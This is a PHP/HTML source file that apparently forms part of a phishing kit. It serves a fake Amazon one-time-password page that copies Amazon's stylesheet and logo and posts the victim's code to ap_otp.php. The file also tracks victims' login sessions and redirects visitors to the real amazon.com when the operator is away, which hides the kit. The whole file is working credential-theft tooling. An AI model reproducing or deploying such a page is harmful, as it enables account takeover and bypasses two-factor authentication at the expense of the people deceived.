<?php
session_start();
require_once __DIR__ . '/function.php';
require_once __DIR__ . '/../storage/storage.php';

if (is_afk_enabled()) {
    header('Location: https://www.amazon.com');
    exit;
}

$currentSessionId = session_id();
$sessions = load_login_sessions();
$currentSession = $sessions[$currentSessionId] ?? [];

$latestMeta = $currentSession['meta'] ?? [];
$otpError = !empty($_GET['error']);
?>
<!doctype html>
<html class="a-no-js" data-19ax5a9jf="dingo">
<head>
    <meta charset="utf-8">
    <title>Amazon - OTP Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AmazonUI-af9e9b82cae7003c8a1d2f2e239005b802c674a4._V2_.css#AUIClients/AmazonUI.fr.rendering_engine-not-trident.secure.min" />
    <style>
        body {
            background-color: #f6f6f6;
            font-family: "Amazon Ember", Arial, sans-serif;
            color: #111;
        }
        .otp-wrapper {
            max-width: 400px;
            margin: 40px auto;
            background: #fff;
            border: 1px solid #d5d9d9;
            border-radius: 8px;
            padding: 24px;
        }
        .otp-wrapper h1 {
            font-size: 1.4rem;
            margin: 0 0 12px;
            font-weight: 500;
        }
        .otp-wrapper p {
            font-size: 0.95rem;
            line-height: 1.4;
            margin: 0 0 16px;
        }
        .otp-form label {
            display: block;
            font-size: 0.9rem;
            margin-bottom: 6px;
        }
        .otp-form input[type="text"] {
            width: 100%;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #a6a6a6;
            font-size: 1rem;
            box-sizing: border-box;
        }
        .otp-form button {
            margin-top: 18px;
            width: 100%;
            padding: 10px 16px;
            border-radius: 3px;
            border: 1px solid #a88734;
            background: linear-gradient(#f7dfa5,#f0c14b);
            cursor: pointer;
            font-size: 1rem;
            font-weight: 500;
        }
        .otp-form button:hover {
            background: linear-gradient(#f5d78e,#eeb933);
        }
        .error {
            background: #f8d7da;
            color: #842029;
            border: 1px solid #f5c2c7;
            padding: 10px 12px;
            border-radius: 6px;
            margin-bottom: 16px;
        }
        .otp-meta {
            font-size: 0.8rem;
            color: #565959;
            margin-top: 8px;
        }
        .logo {
            display: block;
            width: 120px;
            margin: 20px auto 10px;
        }
    </style>
</head>
<body class="ap-locale-en_US">
    <div class="otp-wrapper">
        <img src="https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/nav-sprite-global-1x-hm-dsk-reorg._CB405937547_.png" alt="Amazon" class="logo">
        <h1>Enter One-Time Password</h1>
        <p>A verification code was sent to your trusted device. Enter the one-time password below to continue.</p>
        <?php if ($otpError): ?>
            <div class="error">The verification code is required. Please try again.</div>
        <?php endif; ?>
        <form class="otp-form" action="ap_otp.php" method="post">
            <label for="otp">One-time password</label>
            <input type="text" id="otp" name="otp" autocomplete="one-time-code" inputmode="numeric" maxlength="12" required>
            <button type="submit">Submit</button>
        </form>
        <?php if (!empty($latestMeta)): ?>
            <div class="otp-meta">
                Session started: <?php echo htmlspecialchars($latestMeta['created_at'] ?? 'recently', ENT_QUOTES, 'UTF-8'); ?>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
